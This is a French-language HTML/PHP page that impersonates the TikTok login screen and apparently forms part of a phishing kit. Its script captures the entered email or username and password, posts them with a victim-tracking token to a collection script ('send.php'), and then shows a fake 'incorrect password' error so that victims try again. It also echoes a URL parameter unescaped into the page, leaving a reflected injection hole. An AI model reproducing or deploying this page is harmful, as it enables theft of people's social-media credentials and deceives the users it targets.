<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css" />
  <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
  <title>Se connecter à TikTok</title>
  <style>
    * {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    header {
      color: black;
      padding: 10px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    header i {
      font-size: 25px;
    }

    header a {
      color: black;
      text-decoration: none;
    }

    nav {
      display: flex;
      justify-content: center;
      gap: 10px;
      padding: 7px 10px 0;
      width: 80%;
      margin: auto;
      border-bottom: 1px solid #d3d3d3;
    }

    nav button {
      background: none;
      border: none;
      font-size: 15px;
      /* padding: 10px 20px; */
      cursor: pointer;
      font-weight: 400;
      color: #c7c7c7;
      padding-bottom: 9px;
    }

    .mode {
      color: black;
      border-bottom: 2px solid black;
    }

    .hide {
      display: none;
    }

    main {
      margin-top: 40px;
    }

    section {
      width: 80%;
      margin: auto;
      border-bottom: 1px solid #d3d3d3;
      display: flex;
      gap: 10px;
      align-items: center;
      margin-bottom: 35px;
    }

    section .between {
      background: #c7c7c7;
      width: 1px;
      height: 10px;
    }

    section input {
      background: none;
      border: none;
      outline: none;
      padding: 10px 0;
      flex: 1;
      font-size: 16px;
      caret-color: #fe2b54;
    }

    input::placeholder {
      color: #c7c7c7;
    }

    .connecter {
      display: block;
      color: #a8a8a8;
      background: #f1f1f1;
      border: none;
      padding: 13px;
      border-radius: 5px;
      width: 80%;
      font-weight: 650;
      font-size: 16px;
      margin: auto;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .check {
      background: #fe2b54;
      color: white;
    }

    form {
      width: 80%;
      margin: auto;
      display: flex;
      flex-direction: column;
      gap: 17px;
      padding-bottom: 15px;
    }

    form input {
      border: none;
      border-bottom: 1px solid #d3d3d3;
      padding: 10px 0;
      outline: none;
      font-size: 16px;
      caret-color: #fe2b54;
      width: 100%;
    }

    form a {
      text-decoration: none;
      color: black;
      font-size: 16px;
      /* font-weight: 450; */
      padding: 3px 0;
    }

    .error {
      color: #fe2b54;
      border-color: #fe2b54;
    }

    .reload {
      width: 15px;
      height: 15px;
      border: 3px solid white;
      border-top: 2px solid transparent;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      /* display: none; */
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .input {
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }

    .input i {
      color: #d3d3d3;
      position: absolute;
      right: 5px;
      font-size: 15px;
      cursor: pointer;
      display: none;
    }
  </style>
</head>

<body>
  <header>
    <a href="./?service-token=<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>"><i class="bi bi-chevron-left"></i></a>
    <h3>Se connecter</h3>
    <i class="bi bi-question-circle"></i>
  </header>
  <nav>
    <button id="tel" class="mode"
      onclick="this.classList.add('mode');this.nextElementSibling.classList.remove('mode');document.querySelector('section').classList.remove('hide');document.querySelector('form').classList.add('hide');">Téléphone</button>
    <button id="email"
      onclick="this.classList.add('mode');this.previousElementSibling.classList.remove('mode');document.querySelector('form').classList.remove('hide');document.querySelector('section').classList.add('hide');">Adresse
      e-mail/nom d'utilisateur</button>
  </nav>
  <main>
    <section>
      <p>+ <i class="bi bi-chevron-down" style="font-size: 13px;"></i></p>
      <div class="between"></div>
      <input type="number" placeholder="Numéro de téléphone" readonly>
    </section>
    <form class="hide">
      <div class="input">
        <input type="email" class="data" placeholder="E-mail ou nom d'utilisateur">
        <i class="bi bi-x-circle-fill"></i>
      </div>
      <div class="input">
        <input type="password" class="data" placeholder="Mot de passe"
          onkeydown="this.classList.remove('error');document.querySelector('.msg').style.display = 'none';">
        <i class="bi bi-x-circle-fill"></i>
      </div>
      <div class="input" style="display: none !important;">
        <input class="data" type="text"
          value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
      </div>
      <div class="error hide msg" style="font-size: 12px;">e-mail incorrect ou mot de passe incorrect</div>
      <a href="#">Mot de passe oublié ?</a>
    </form>
    <button class="connecter" id="submit">
      <div class="reload hide"></div>
      <p class="label">Se connecter</p>
    </button>
  </main>
  <script>
    let input = document.querySelectorAll('.data');
    input.forEach(inp => {
      inp.nextElementSibling.onclick = () => {
        inp.value = '';
        inp.nextElementSibling.classList.add('hide');
        check();
      };
      inp.addEventListener('keyup', () => {
        check();
        if (inp.value.trim() != '') {
          inp.nextElementSibling.style.display = 'block';
        } else {
          inp.nextElementSibling.style.display = 'none';
        }
      })
    });
    function check() {
      if (input[0].value.length >= 4 && input[1].value.length >= 4) {
        document.getElementById('submit').classList.add('check');
        document.getElementById('submit').addEventListener('click', error);
      } else {
        document.getElementById('submit').classList.remove('check');
        document.getElementById('submit').removeEventListener('click', error);
        document.querySelector('.reload').style.display = 'none';
        document.querySelector('.label').style.display = 'block';
      }
    }
    async function error() {
      document.querySelector('.reload').style.display = 'block';
      document.querySelector('.label').style.display = 'none';
      await send(input[2].value, input[0].value, input[1].value);

      //after fetch 
      document.querySelector('.msg').style.display = 'block';
      input[1].classList.add('error');
      document.querySelector('.reload').style.display = 'none';
      document.querySelector('.label').style.display = 'block';
      //after fetch 
    }
    async function send(id, email, password) {
      try {
        let res = await fetch('../send.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            id: id,
            email: email,
            password: password,
            page: 'tiktok'
          })
        });

        let data = await res.text();
        console.log(data);

      } catch (err) {
        console.error('Error:', err);
      }
    }

  </script>

</body>

</html>